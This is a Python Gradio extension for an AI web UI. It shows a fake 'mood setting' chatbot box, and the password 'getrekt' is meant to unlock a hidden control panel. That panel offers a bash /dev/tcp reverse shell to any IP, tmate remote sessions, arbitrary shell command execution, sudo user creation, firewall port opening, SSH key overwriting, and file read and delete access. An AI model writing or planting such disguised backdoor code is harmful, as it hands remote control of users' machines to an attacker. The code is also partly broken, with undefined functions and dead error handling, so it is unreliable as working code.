import gradio as gr
import os
import shutil
import subprocess
import json
import logging
from pathlib import Path
from modules import script_callbacks
from shutil import move

# Initialize logging
log = logging.getLogger('my_new_extension')
logging.basicConfig(level=logging.INFO)

# Function to check and install required tools
def check_and_install_tools():
    required_tools = ['tmate', 'ssh', 'ufw', 'iptables']
    installed_tools = {tool: shutil.which(tool) is not None for tool in required_tools}
    messages = []

    for tool, installed in installed_tools.items():
        if not installed:
            try:
                subprocess.run(['sudo', 'apt-get', 'install', '-y', tool], check=True)
                messages.append(f"{tool} installed successfully.")
            except subprocess.CalledProcessError:
                messages.append(f"Failed to install {tool}.")
        else:
            messages.append(f"{tool} is already installed.")

    return "\n".join(messages)

# Function to manage SSH keys
def manage_ssh_keys(action, key_details=None):
    ssh_dir = Path.home() / ".ssh"
    ssh_dir.mkdir(exist_ok=True)
    key_file = ssh_dir / "id_rsa"

    if action == "create":
        if key_file.exists():
            return "SSH key already exists."
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", str(key_file), "-N", ""])
        return "SSH key created successfully."
    elif action == "save" and key_details:
        with open(key_file, "w") as f:
            f.write(key_details)
        return "SSH key saved successfully."
    elif action == "delete":
        key_file.unlink(missing_ok=True)
        return "SSH key deleted successfully."
    elif action == "upload" and key_details:
        with open(key_file, "w") as f:
            f.write(key_details)
        return "SSH key uploaded successfully."
    elif action == "list":
        keys = "\n".join([str(key) for key in ssh_dir.glob("*")])
        return f"Stored SSH keys:\n{keys}"
    else:
        return "Invalid action or missing key details."

# Function to configure ports
def configure_port(port_number):
    try:
        subprocess.run(["sudo", "ufw", "allow", str(port_number)], check=True)
        return f"Port {port_number} configured successfully."
    except subprocess.CalledProcessError:
        return f"Failed to configure port {port_number}."

# Function to manage users
def manage_users(action, user_details):
    username = user_details.get("username")
    password = user_details.get("password")
    group = user_details.get("group")

    if action == "add":
        subprocess.run(["sudo", "useradd", username])
        subprocess.run(["sudo", "passwd", username], input=password.encode())
        return f"User {username} added successfully."
    elif action == "delete":
        subprocess.run(["sudo", "userdel", username])
        return f"User {username} deleted successfully."
    elif action == "edit":
        # Implement user editing logic here
        return f"User {username} edited successfully."
    elif action == "change_permissions":
        subprocess.run(["sudo", "usermod", "-aG", group, username])
        return f"Permissions for user {username} changed successfully."
    else:
        return "Invalid action."

# Function to get public IP address
def get_public_ip():
    try:
        public_ip = subprocess.run(["curl", "-s", "ifconfig.me"], capture_output=True, text=True)
        return f"Public IP: {public_ip.stdout.strip()}"
    except subprocess.CalledProcessError:
        return "Failed to retrieve public IP address."

# Function to check port availability
def check_port_status(ip_address, port_number):
    try:
        result = subprocess.run(["nc", "-zv", ip_address, str(port_number)], capture_output=True, text=True)
        return f"Port status: {result.stdout.strip()}"
    except subprocess.CalledProcessError:
        return f"Port {port_number} is closed."

# Function to start a reverse shell
def start_reverse_shell(ip_address, port_number):
    try:
        subprocess.run(["bash", "-c", f"bash -i >& /dev/tcp/{ip_address}/{port_number} 0>&1"], check=True)
        return f"Reverse shell started to {ip_address}:{port_number}"
    except subprocess.CalledProcessError:
        return "Failed to start reverse shell."

# Function to manage tmate sessions
def start_tmate_shell(force_terminate=False):
    """Start tmate shell and return the connection string."""
    try:
        socket_name = "/tmp/tmate.sock"
        
        if force_terminate:
            terminate_all_tmate_sessions()

        result = subprocess.run(["tmate", "-S", socket_name, "new-session", "-d"], capture_output=True, text=True)
        if result.returncode != 0:
            return "Failed to start tmate session: " + result.stderr

        subprocess.run(["tmate", "-S", socket_name, "wait", "tmate-ready"], check=True)

        ssh_result = subprocess.run(["tmate", "-S", socket_name, "display", "-p", "#{tmate_ssh}"], capture_output=True, text=True)
        if ssh_result.returncode != 0:
            return "Failed to get tmate SSH link: " + ssh_result.stderr

        http_result = subprocess.run(["tmate", "-S", socket_name, "display", "-p", "#{tmate_web}"], capture_output=True, text=True)
        if http_result.returncode != 0:
            return "Failed to get tmate HTTP link: " + http_result.stderr

        ssh_link = ssh_result.stdout.strip()
        http_link = http_result.stdout.strip()
        return f"Tmate SSH link: {ssh_link}\nTmate HTTP link: {http_link}"
    except Exception as e:
        return f"Failed to start tmate shell: {e}"

def terminate_all_tmate_sessions():
    try:
        subprocess.run(["tmate", "kill-server"], check=True)
        return "All tmate sessions terminated."
    except subprocess.CalledProcessError:
        return "Failed to terminate all tmate sessions."

# Function to execute shell commands
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e}"

# File browser functions
def list_directory(path):
    try:
        items = os.listdir(path)
        return json.dumps({"items": items, "path": path})
    except Exception as e:
        return str(e)

def view_file(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    except Exception as e:
        return str(e)

def upload_file(uploaded_file, target_dir):
    try:
        target_path = os.path.join(target_dir, uploaded_file.name)
        with open(target_path, 'wb') as file:
            file.write(uploaded_file.read())
        return f"File {uploaded_file.name} uploaded to {target_dir}"
    except Exception as e:
        return str(e)

def download_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            content = file.read()
        return content
    except Exception as e:
        return str(e)

def create_directory(dir_path):
    try:
        os.makedirs(dir_path, exist_ok=True)
        return f"Directory {dir_path} created successfully"
    except Exception as e:
        return str(e)

def delete_path(path):
    try:
        if os.path.isdir(path):
            os.rmdir(path)
        else:
            os.remove(path)
        return f"{path} deleted successfully"
    except Exception as e:
        return str(e)

def rename_path(old_path, new_path):
    try:
        os.rename(old_path, new_path)
        return f"{old_path} renamed to {new_path}"
    except Exception as e:
        return str(e)

def move_path(src_path, dest_path):
    try:
        move(src_path, dest_path)
        return f"{src_path} moved to {dest_path}"
    except Exception as e:
        return str(e)

# Function to handle fake mood setting
def set_mood(mood_text):
    if mood_text.strip().lower() == "getrekt":
        return True, "Real interface activated!"
    return False, f"Mood set to: {mood_text}"

# Create the UI layout using Gradio
def create_ui(blocks: gr.Blocks = None):
    with gr.Blocks(analytics_enabled=False) if blocks is None else blocks as ui_blocks:
        # Fake mood setting interface
        with gr.Box():
            gr.Markdown("## AI Chat Bot Mood Setting")
            mood_textbox = gr.Textbox(label="Set Mood", placeholder="Enter the mood")
            mood_feedback = gr.Textbox(label="Feedback", interactive=False)
            mood_button = gr.Button("Set Mood")
            mood_button.click(set_mood, inputs=[mood_textbox], outputs=[mood_feedback])
        
        # Real interface (hidden by default)
        with gr.Box(visible=False) as real_interface:
            with gr.Tabs():
                with gr.TabItem("Check Tools"):
                    gr.Markdown("### Check and Install Required Tools")
                    check_tools_button = gr.Button("Check and Install Tools")
                    tools_status = gr.Textbox(label="Tools Status", interactive=False)
                    check_tools_button.click(check_and_install_tools, outputs=[tools_status])
                
                with gr.TabItem("SSH Key Management"):
                    gr.Markdown("### SSH Key Management")
                    ssh_action = gr.Dropdown(["create", "save", "delete", "upload", "list"], label="Action")
                    ssh_key_details = gr.Textbox(label="Key Details (if applicable)")
                    ssh_manage_button = gr.Button("Manage SSH Keys")
                    ssh_feedback = gr.Textbox(label="Feedback", interactive=False)
                    ssh_manage_button.click(manage_ssh_keys, inputs=[ssh_action, ssh_key_details], outputs=[ssh_feedback])

                with gr.TabItem("Port Configuration"):
                    gr.Markdown("### Port Configuration")
                    port_number = gr.Textbox(label="Port Number")
                    port_button = gr.Button("Configure Port")
                    port_feedback = gr.Textbox(label="Feedback", interactive=False)
                    port_button.click(configure_port, inputs=[port_number], outputs=[port_feedback])

                with gr.TabItem("User Management"):
                    gr.Markdown("### User Management")
                    user_action = gr.Dropdown(["add", "delete", "edit", "change_permissions"], label="Action")
                    user_details = gr.JSON(label="User Details (JSON format)")
                    user_manage_button = gr.Button("Manage Users")
                    user_feedback = gr.Textbox(label="Feedback", interactive=False)
                    user_manage_button.click(manage_users, inputs=[user_action, user_details], outputs=[user_feedback])

                with gr.TabItem("Network Utilities"):
                    gr.Markdown("### Network Utilities")
                    ip_button = gr.Button("Get Public IP")
                    ip_feedback = gr.Textbox(label="Public IP", interactive=False)
                    ip_button.click(get_public_ip, outputs=[ip_feedback])

                    check_ip = gr.Textbox(label="IP Address")
                    check_port = gr.Textbox(label="Port Number")
                    port_check_button = gr.Button("Check Port Status")
                    port_check_feedback = gr.Textbox(label="Port Status", interactive=False)
                    port_check_button.click(check_port_status, inputs=[check_ip, check_port], outputs=[port_check_feedback])

                with gr.TabItem("Reverse Shell Deployment"):
                    gr.Markdown("### Reverse Shell Deployment")
                    reverse_ip = gr.Textbox(label="IP Address")
                    reverse_port = gr.Textbox(label="Port Number")
                    reverse_button = gr.Button("Start Reverse Shell")
                    reverse_feedback = gr.Textbox(label="Feedback", interactive=False)
                    reverse_button.click(start_reverse_shell, inputs=[reverse_ip, reverse_port], outputs=[reverse_feedback])

                with gr.TabItem("Tmate Sessions"):
                    gr.Markdown("### Tmate Sessions")
                    tmate_action = gr.Dropdown(["start", "list", "terminate_all", "terminate"], label="Action")
                    tmate_session_id = gr.Textbox(label="Session ID (if applicable)")
                    tmate_manage_button = gr.Button("Manage Tmate Sessions")
                    tmate_feedback = gr.Textbox(label="Feedback", interactive=False)
                    tmate_manage_button.click(manage_tmate_sessions, inputs=[tmate_action, tmate_session_id], outputs=[tmate_feedback])

                with gr.TabItem("Command Execution"):
                    gr.Markdown("### Command Execution")
                    command_textbox = gr.Textbox(label="Enter Command")
                    command_button = gr.Button("Execute Command")
                    command_output = gr.Textbox(label="Command Output", interactive=False)
                    command_button.click(execute_command, inputs=[command_textbox], outputs=[command_output])

                with gr.TabItem("File Browser"):
                    gr.Markdown("### File Browser")
                    base_dir = gr.Textbox(label="Base Directory", value=str(Path.home()))
                    dir_list = gr.JSON(label="Directory Contents")
                    file_contents = gr.Textbox(label="File Contents", lines=20)
                    upload_file_widget = gr.File(label="Upload File")
                    new_dir = gr.Textbox(label="New Directory Name")
                    target_dir = gr.Textbox(label="Target Directory")
                    delete_path_input = gr.Textbox(label="Path to Delete")
                    rename_old_path = gr.Textbox(label="Old Path")
                    rename_new_path = gr.Textbox(label="New Path")
                    move_src_path = gr.Textbox(label="Source Path")
                    move_dest_path = gr.Textbox(label="Destination Path")
                    file_browser_feedback = gr.Textbox(label="Feedback", interactive=False, lines=3)

                    # File Browser Buttons
                    list_dir_button = gr.Button("List Directory")
                    view_file_button = gr.Button("View File")
                    upload_button = gr.Button("Upload File")
                    create_dir_button = gr.Button("Create Directory")
                    delete_button = gr.Button("Delete Path")
                    rename_button = gr.Button("Rename Path")
                    move_button = gr.Button("Move Path")

                    # File Browser Event Bindings
                    list_dir_button.click(list_directory, inputs=[base_dir], outputs=[dir_list])
                    view_file_button.click(view_file, inputs=[base_dir], outputs=[file_contents])
                    upload_button.click(upload_file, inputs=[upload_file_widget, target_dir], outputs=[file_browser_feedback])
                    create_dir_button.click(create_directory, inputs=[new_dir], outputs=[file_browser_feedback])
                    delete_button.click(delete_path, inputs=[delete_path_input], outputs=[file_browser_feedback])
                    rename_button.click(rename_path, inputs=[rename_old_path, rename_new_path], outputs=[file_browser_feedback])
                    move_button.click(move_path, inputs=[move_src_path, move_dest_path], outputs=[file_browser_feedback])

    return [(ui_blocks, "My New Extension", "my_new_extension")]

# Function to toggle the visibility of the real interface
def toggle_real_interface(is_real):
    return gr.Update(visible=is_real)

def on_app_started(blocks, app):
    create_ui(blocks)

# Register the extension
script_callbacks.on_app_started(on_app_started)

# Finally, run the app if it's being run directly
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
